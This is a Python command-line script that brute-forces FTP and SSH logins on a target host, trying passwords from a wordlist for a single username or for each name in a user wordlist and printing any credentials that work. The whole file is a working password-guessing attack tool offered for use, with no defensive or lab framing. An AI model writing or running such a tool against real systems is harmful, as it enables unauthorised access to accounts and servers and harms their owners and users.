import sys, time, socket, paramiko, re

if len(sys.argv) < 4:
    print("Bruteforce script for FTP and SSH")
    print("**************************USAGE*****************************************")
    print("python bruteForceServices [TYPE] [TARGET] [USER] [WORDLISTPASSWORD]")
    print("*****************************OR*****************************************")
    print("python bruForcerServices [TYPE] [TARGET] -U [WORDLISTUSERS] [WORDLISTPASSWORD]")

type = sys.argv[1]
target = sys.argv[2]
user = sys.argv[3]

if type == "ftp" or type == "FTP":
    if user == "-U":
        wordlistuser = open(sys.argv[4]).read().split("\n")
        wordlistpass = open(sys.argv[5]).read().split("\n")

        for users in wordlistuser:
            print("Testing USER ---> " + users)
            for passwords in wordlistpass:
                msocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                msocket.connect((target, 21))
                response = msocket.recv(1024)
                msocket.send("USER "+users+"\n")
                response = msocket.recv(1024)
                msocket.send("PASS "+passwords+"\n")
                response = msocket.recv(1024)
                msocket.send("QUIT \n")

                if re.search("230",response):
                    print("|-----------------------------------------|")
                    print("|User found: "+ users+"                   |")
                    print("|Password found: " +passwords+"           |")
                    print("|-----------------------------------------|")
                    sys.exit()
                else:
                    print("Wrong password: " +passwords)

    else:
        wordlistpass = open(sys.argv[4]).read().split("\n")
        for passwords in wordlistpass:
                msocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                msocket.connect((target, 21))
                response = msocket.recv(1024)
                msocket.send("USER "+user+"\n")
                response = msocket.recv(1024)
                msocket.send("PASS "+passwords+"\n")
                response = msocket.recv(1024)
                msocket.send("QUIT \n")

                if re.search("230",response):
                    print("|-----------------------------------------|")
                    print("|Password found: " +passwords+"           |")
                    print("|-----------------------------------------|")
                    sys.exit()
                else:
                    print("Wrong password: " +passwords)
                    
elif type == "ssh" or type == "SSH":
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if user == "-U":
        wordlistuser = open(sys.argv[4]).read().split("\n")
        wordlistpass = open(sys.argv[5]).read().split("\n")

        for users in wordlistuser:
            for passwords in wordlistpass:
                try:
                    time.sleep(5)
                    ssh.connect(target, username=users, password=passwords, look_for_keys=False, allow_agent=False)
                except paramiko.AuthenticationException:
                    time.sleep(5)
                    print("Access Denied:[user]---> "+users+"|" + " [password]---> " +passwords)
                else:
                    print("FOUND USER: ----> " , users)
                    print("FOUND PASSWORD: ----> ", passwords)
                    sys.exit()

    else:
        wordlistpass = open(sys.argv[4]).read().split()

        for passwords in wordlistpass:
            try:
                time.sleep(5)
                ssh.connect(target, username=user, password=passwords, look_for_keys=False, allow_agent=False)
            except paramiko.AuthenticationException:
                time.sleep(5)
                print("[password]---> " +passwords)
            else:
                print("FOUND PASSWORD: ----> " +passwords)
                sys.exit()
